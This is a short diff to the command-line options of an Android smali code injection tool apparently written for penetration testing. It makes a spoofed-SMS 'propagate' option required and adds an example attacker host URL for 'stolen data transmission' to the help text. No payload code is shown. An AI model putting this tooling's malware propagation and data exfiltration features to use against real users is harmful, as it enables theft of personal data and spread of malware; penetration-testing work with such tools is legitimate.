@@ -50,7 +50,7 @@ def banner():
 def copyright():
     copyright = """
         =[ smali-code-injector v1.2-dev              |
-+ -- ---=[ Alexandre Teyar @Ares                     |
++ -- ---=[ Alexandre Teyar | Ares                    |
 + -- ---=[ Penetration tester at Ambersail Ltd.      |
 + -- ---=[ GitHub:   github.com/AresS31              |
         =[ LinkedIn: linkedin.com/in/alexandre-teyar |
@@ -150,7 +150,7 @@ def parse_args():
         "--propagate",
         dest="propagate",
         help="spoofed SMS to send for the malware propagation",
-        required=False,
+        required=True,
         type=str
     )
 
@@ -158,7 +158,10 @@ def parse_args():
         "-rh",
         "--rhost",
         dest="rhost",
-        help="attacker's host/ip for stolen data transmission",
+        help=(
+            "attacker's host/ip for stolen data transmission, "
+            "e.g. http://192.168.0.24/handler.php"
+        ),
         required=True,
         type=str
     )
